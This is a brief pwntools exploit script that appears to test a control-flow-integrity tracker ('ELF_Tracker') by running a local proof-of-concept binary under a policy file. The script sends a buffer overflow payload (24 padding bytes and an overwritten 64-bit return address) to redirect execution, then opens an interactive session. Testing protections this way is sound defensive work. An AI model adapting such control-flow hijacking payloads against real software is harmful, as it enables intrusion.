from pwn import *
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
TARGET = ROOT / "poc"
POLICY = ROOT / "policy" / "poc.policy"

e = ELF(str(TARGET), checksec=False)
r = process(
    [str(ROOT / "ELF_Tracker"), str(TARGET)],
    env={"ET_CSCFI_POLICY": str(POLICY)},
)

payload = b"A" * 24 + p64(0x4011DF)
r.recvuntil(b"input:\n")
r.send(payload)
r.interactive()
